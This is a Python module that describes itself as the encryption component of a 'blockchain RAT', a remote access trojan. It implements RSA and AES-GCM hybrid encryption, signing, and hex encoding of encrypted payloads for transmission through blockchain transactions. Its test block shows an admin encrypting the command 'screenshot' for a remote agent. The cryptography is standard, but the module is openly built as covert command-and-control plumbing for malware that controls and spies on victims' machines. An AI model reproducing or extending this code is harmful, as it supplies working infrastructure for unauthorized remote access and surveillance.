"""
Encryption utilities for blockchain RAT
Uses hybrid encryption: RSA for key exchange, AES-256-GCM for data
"""

import os
import gzip
import json
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64


class EncryptionManager:
    def __init__(self):
        self.rsa_key_size = 2048
        
    def generate_rsa_keypair(self):
        """Generate RSA keypair"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=self.rsa_key_size
        )
        
        public_key = private_key.public_key()
        
        # Serialize keys
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        return {
            'private_key': private_pem.decode('utf-8'),
            'public_key': public_pem.decode('utf-8'),
            'private_key_obj': private_key,
            'public_key_obj': public_key
        }
    
    def load_private_key(self, private_pem):
        """Load private key from PEM string"""
        return serialization.load_pem_private_key(
            private_pem.encode('utf-8'),
            password=None
        )
    
    def load_public_key(self, public_pem):
        """Load public key from PEM string"""
        return serialization.load_pem_public_key(
            public_pem.encode('utf-8')
        )
    
    def generate_aes_key(self):
        """Generate 256-bit AES key"""
        return os.urandom(32)
    
    def encrypt_aes_gcm(self, data, key):
        """Encrypt data with AES-256-GCM"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Generate random IV
        iv = os.urandom(16)
        
        # Create cipher
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        encryptor = cipher.encryptor()
        
        # Encrypt data
        ciphertext = encryptor.update(data) + encryptor.finalize()
        
        return {
            'ciphertext': ciphertext,
            'iv': iv,
            'tag': encryptor.tag
        }
    
    def decrypt_aes_gcm(self, ciphertext, key, iv, tag):
        """Decrypt data with AES-256-GCM"""
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
        decryptor = cipher.decryptor()
        
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        return plaintext
    
    def encrypt_rsa(self, data, public_key):
        """Encrypt data with RSA public key"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        if isinstance(public_key, str):
            public_key = self.load_public_key(public_key)
        
        ciphertext = public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return ciphertext
    
    def decrypt_rsa(self, ciphertext, private_key):
        """Decrypt data with RSA private key"""
        if isinstance(private_key, str):
            private_key = self.load_private_key(private_key)
        
        plaintext = private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return plaintext
    
    def hybrid_encrypt(self, data, recipient_public_key):
        """
        Hybrid encryption: encrypt data with recipient's public key
        Returns encrypted payload ready for blockchain transmission
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Compress data first
        compressed_data = gzip.compress(data)
        
        # Generate random AES key
        aes_key = self.generate_aes_key()
        
        # Encrypt data with AES
        aes_result = self.encrypt_aes_gcm(compressed_data, aes_key)
        
        # Encrypt AES key with recipient's RSA public key
        encrypted_key = self.encrypt_rsa(aes_key, recipient_public_key)
        
        return {
            'encrypted_data': aes_result['ciphertext'],
            'encrypted_key': encrypted_key,
            'iv': aes_result['iv'],
            'tag': aes_result['tag']
        }
    
    def hybrid_decrypt(self, encrypted_payload, private_key):
        """
        Hybrid decryption: decrypt data with private key
        """
        # Decrypt AES key with RSA private key
        aes_key = self.decrypt_rsa(encrypted_payload['encrypted_key'], private_key)
        
        # Decrypt data with AES key
        compressed_data = self.decrypt_aes_gcm(
            encrypted_payload['encrypted_data'],
            aes_key,
            encrypted_payload['iv'],
            encrypted_payload['tag']
        )
        
        # Decompress data
        data = gzip.decompress(compressed_data)
        return data
    
    def encode_payload_for_blockchain(self, payload):
        """
        Encode encrypted payload for blockchain transmission
        Returns hex string suitable for blockchain transaction
        """
        # Convert all bytes to base64 for JSON serialization
        encoded_payload = {
            'encrypted_data': base64.b64encode(payload['encrypted_data']).decode('utf-8'),
            'encrypted_key': base64.b64encode(payload['encrypted_key']).decode('utf-8'),
            'iv': base64.b64encode(payload['iv']).decode('utf-8'),
            'tag': base64.b64encode(payload['tag']).decode('utf-8')
        }
        
        # Convert to JSON and then to hex
        json_str = json.dumps(encoded_payload, separators=(',', ':'))
        hex_payload = json_str.encode('utf-8').hex()
        
        return '0x' + hex_payload
    
    def decode_payload_from_blockchain(self, hex_payload):
        """
        Decode encrypted payload from blockchain
        """
        # Remove 0x prefix and convert from hex
        if hex_payload.startswith('0x'):
            hex_payload = hex_payload[2:]
        
        json_str = bytes.fromhex(hex_payload).decode('utf-8')
        encoded_payload = json.loads(json_str)
        
        # Decode base64 back to bytes
        payload = {
            'encrypted_data': base64.b64decode(encoded_payload['encrypted_data']),
            'encrypted_key': base64.b64decode(encoded_payload['encrypted_key']),
            'iv': base64.b64decode(encoded_payload['iv']),
            'tag': base64.b64decode(encoded_payload['tag'])
        }
        
        return payload
    
    def sign_data(self, data, private_key):
        """Sign data with private key"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        if isinstance(private_key, str):
            private_key = self.load_private_key(private_key)
        
        signature = private_key.sign(
            data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return signature
    
    def verify_signature(self, data, signature, public_key):
        """Verify signature with public key"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        if isinstance(public_key, str):
            public_key = self.load_public_key(public_key)
        
        try:
            public_key.verify(
                signature,
                data,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )
            return True
        except Exception:
            return False
    
    def public_key_to_hex(self, public_key_pem):
        """Convert public key PEM to hex for blockchain storage"""
        return '0x' + public_key_pem.encode('utf-8').hex()
    
    def hex_to_public_key(self, hex_key):
        """Convert hex public key back to PEM"""
        if hex_key.startswith('0x'):
            hex_key = hex_key[2:]
        return bytes.fromhex(hex_key).decode('utf-8')


# Example usage and testing
if __name__ == "__main__":
    # Test encryption functionality
    em = EncryptionManager()
    
    # Generate keypairs for admin and agent
    admin_keys = em.generate_rsa_keypair()
    agent_keys = em.generate_rsa_keypair()
    
    print("Generated keypairs")
    
    # Test hybrid encryption
    test_data = "This is a test command: screenshot"
    
    # Admin encrypts command for agent
    encrypted = em.hybrid_encrypt(test_data, agent_keys['public_key'])
    print("Encrypted data")
    
    # Encode for blockchain
    hex_payload = em.encode_payload_for_blockchain(encrypted)
    print(f"Hex payload length: {len(hex_payload)}")
    
    # Decode from blockchain
    decoded_payload = em.decode_payload_from_blockchain(hex_payload)
    print("Decoded payload")
    
    # Agent decrypts command
    decrypted = em.hybrid_decrypt(decoded_payload, agent_keys['private_key'])
    print(f"Decrypted: {decrypted.decode('utf-8')}")
    
    print("Encryption test successful!")
